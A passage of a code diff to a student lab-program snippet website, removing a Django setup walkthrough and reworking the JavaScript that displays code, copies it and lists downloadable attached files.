-    print("Failed to fetch the page:", e) ` ,
-
-"Django Form with Input Validation (Regex)": 
-    `open terminal and run the below commands one by one 
-python -m venv venv 
-venv\Scripts\activate 
-pip install django 
-django-admin startproject myproject 
-cd myproject 
-python manage.py startapp myapp 
-open folder myproject 
-create folder (templates) in myproject 
-create file (index.html) in templates, add code( in the code add your 
-name and roll no) 
-
-&lt;!DOCTYPE html&gt; 
-&lt;html lang="en"&gt; 
-&lt;head&gt; 
-    &lt;meta charset="UTF-8"&gt; 
-    &lt;meta name="viewport" content="width=device-width, initial scale=1.0"&gt; 
-    &lt;title&gt;Student Profile - Name&lt;/title&gt; 
-    &lt;style&gt; 
-        body { 
-            font-family: Arial, sans-serif; 
-            background-color: #f4f4f9; 
-            margin: 0; 
-            padding: 0; 
-        } 
-        .container { 
-            max-width: 600px; 
-            margin: 50px auto; 
-            padding: 20px; 
-            background-color: #fff; 
-            border-radius: 10px; 
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1); 
-            text-align: center; 
-        } 
-        .container h1 { 
-            color: #333; 
-            font-size: 2em; 
-        } 
-        .details { 
-            margin-top: 20px; 
-            font-size: 1.2em; 
-            color: #555; 
-        } 
-        .details span { 
-            font-weight: bold; 
-            color: #222; 
-        } 
-        .footer { 
-            margin-top: 30px; 
-            font-size: 1em; 
-            color: #888; 
-        } 
-    &lt;/style&gt; 
-&lt;/head&gt; 
-&lt;body&gt; 
-    &lt;div class="container"&gt; 
-        &lt;h1&gt;Student Profile&lt;/h1&gt; 
-        &lt;div class="details"&gt; 
-            &lt;p&gt;&lt;span&gt;Name:&lt;/span&gt; ADD YOUR NAME HERE&lt;/p&gt; 
-            &lt;p&gt;&lt;span&gt;Roll Number:&lt;/span&gt; ADD ROLL NO&lt;/p&gt; 
-            &lt;p&gt;&lt;span&gt;Class:&lt;/span&gt; SYCS (Second Year Computer Science)&lt;/p&gt; 
-            &lt;p&gt;&lt;span&gt;College:&lt;/span&gt; Shah and Anchor Kachhi Engineering College&lt;/p&gt; 
-        &lt;/div&gt; 
-        &lt;div class="footer"&gt; 
-            &lt;p&gt;&copy; 2025&lt;/p&gt; 
-        &lt;/div&gt; 
-    &lt;/div&gt; 
-&lt;/body&gt; 
-&lt;/html&gt;
-
-go to settings.py in myproject  
- in installed apps ('myapp',) 
-go to manage.py 
-go to terminal run command ( python manage.py runserver) 
-Starting development server at http://127.0.0.1:8000/ (click on this http://127.0.0.1:8000/) 
-or 
-go to index.html and click on go live`
-  },
+    "Stop and Wait Protocol": `// Stop and Wait Protocol Implementation
+public class StopAndWait {
+    public static void main(String[] args) {
+        // Basic implementation
+    }
+}`
+  }
 };
 
-// Show programs based on selected subject
+// ✅ Show programs based on subject
 function showPrograms(subject) {
   const programsDiv = document.getElementById('programs');
   const codeDisplay = document.getElementById('codeDisplay');
-  codeDisplay.innerHTML = ''; // Clear previous code
+  codeDisplay.innerHTML = '';
   let html = '<h2>Programs:</h2>';
   for (const programName in data[subject]) {
     html += `<div class="program" onclick="showCode('${subject}', '${programName}')">${programName}</div>`;
@@ -934,21 +1541,43 @@ function showPrograms(subject) {
   programsDiv.innerHTML = html;
 }
 
-// Show code when a program is clicked
+// ✅ Show code + file download options
 function showCode(subject, programName) {
   const codeDisplay = document.getElementById('codeDisplay');
-  const code = data[subject][programName];
-  const escapedCode = code.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+  const program = data[subject][programName];
 
-  codeDisplay.innerHTML = `
+  const escapedCode = program.code.replace(/</g, "&lt;").replace(/>/g, "&gt;");
+
+  let html = `
     <h2>${programName} Code:</h2>
     <div style="position: relative;">
-      <button onclick="copyCode()" style="position: absolute; top: 10px; right: 10px; background-color: #007BFF; color: white; border: none; border-radius: 5px; cursor: pointer;height: 10px;width: 25px; font-size: 5px;">Copy</button>
+      <button onclick="copyCode()" 
+        style="position: absolute; top: 10px; right: 10px; background-color: #007BFF; color: white; border: none; border-radius: 5px; cursor: pointer; height: 10px; width: 25px; font-size: 5px;">
+        Copy
+      </button>
       <pre id="codeBlock">${escapedCode}</pre>
     </div>
   `;
+
+  // ✅ Add any attached files (auto-detect type)
+  if (program.files && program.files.length > 0) {
+    html += `<h2>Attached Files:</h2><ul style="text-align:center; list-style:none; padding:0;">`;
+    for (const file of program.files) {
+      const icon = getFileIcon(file);
+      html += `
+        <li style="margin:5px;">
+          <a href="${safeFilePath(file)}" download style="color:#007BFF; text-decoration:none;">
+            ${icon} Download ${file.split('.').pop().toUpperCase()} File
+          </a>
+        </li>`;
+    }
+    html += `</ul>`;
+  }
+
+  codeDisplay.innerHTML = html;
 }
 
+// ✅ Copy to clipboard
 function copyCode() {
   const codeText = document.getElementById('codeBlock').innerText;
   navigator.clipboard.writeText(codeText).then(() => {
@@ -964,16 +1593,9 @@ function copyCode() {
     copiedMsg.style.boxShadow = '0 2px 6px rgba(0,0,0,0.2)';
     copiedMsg.style.zIndex = '1000';
     document.body.appendChild(copiedMsg);
-
-    setTimeout(() => {
-      copiedMsg.remove();
-    }, 100); // Disappears after 2 seconds
-  }).catch(err => {
-    console.error('Failed to copy code:', err);
+    setTimeout(() => copiedMsg.remove(), 1000);
   });
 }
-
-
 </script>
 
 </body>
